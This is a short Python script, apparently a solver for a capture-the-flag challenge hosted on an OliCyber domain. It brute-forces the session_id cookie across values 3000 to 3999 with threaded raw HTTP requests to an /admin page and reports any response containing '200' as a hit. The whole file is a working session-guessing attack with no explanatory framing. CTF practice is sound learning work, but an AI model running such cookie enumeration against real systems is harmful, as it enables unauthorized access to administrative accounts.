from concurrent.futures import ThreadPoolExecutor
import socket
import time

host = "too-small-reminder.challs.olicyber.it"
baseline_length = None
def check(i):
    time.sleep(0.01)
    global baseline_length
    try:
        req = (
            f"GET /admin HTTP/1.1\r\n"
            f"Host: too-small-reminder.challs.olicyber.it\r\n"
            f"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"Connection: close\r\n"
            f"Cookie: session_id={i}\r\n"
            f"Upgrade-Insecure-Requests: 1\r\n"
            f"Priority: u=0, i\r\n"
            f"\r\n"
        )

        #print("Trying", i)

        s = socket.socket()
        s.connect((host, 80))
        s.send(req.encode())
        s.settimeout(2)

        response = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
                print(f"[SUCCESSFUL TRY OF] {i}")
            except socket.timeout:
                print(f"[TIMEOUT while receiving] {i}")
                break

        s.close()

        res = response.decode(errors="ignore")
        #print(res)
        length = len(res)

        # establish baseline
        if baseline_length is None:
           baseline_length = length

        # detect anomaly
        if "200" in res:

            print("\n[!!!] DIFFERENT RESPONSE FOUND")
            print("ID:", i)
            print("Length:", length)
            print(res[:500])  # print partial
            return True
    except Exception as e:
        print("ERROR:", e)

    return False

#for i in range(1000, 1005):
 #   check(i)

with ThreadPoolExecutor(max_workers=5) as ex:
   ex.map(check, range(3000, 4000))
